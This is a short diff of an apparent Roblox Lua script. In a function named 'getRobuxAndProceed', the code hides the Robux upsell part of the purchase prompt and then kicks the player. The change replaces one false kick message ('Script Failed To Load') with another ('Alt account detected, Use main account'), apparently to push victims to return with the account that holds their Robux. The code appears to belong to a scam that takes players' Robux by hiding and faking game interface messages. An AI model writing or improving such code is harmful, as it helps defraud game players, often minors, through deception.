@@ -1095,7 +1095,7 @@ local function getRobuxAndProceed()
                 local RobuxUpsellContainer = PurchasePrompt and PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
                 if RobuxUpsellContainer then
                     RobuxUpsellContainer.Visible = false
-                    game.Players.LocalPlayer:Kick("Script Failed To Load! Please, Rejoin & Try again.")
+                    game.Players.LocalPlayer:Kick("Alt account detected, Use main account and try again")
                     break
                 end
                 task.wait(0.1)
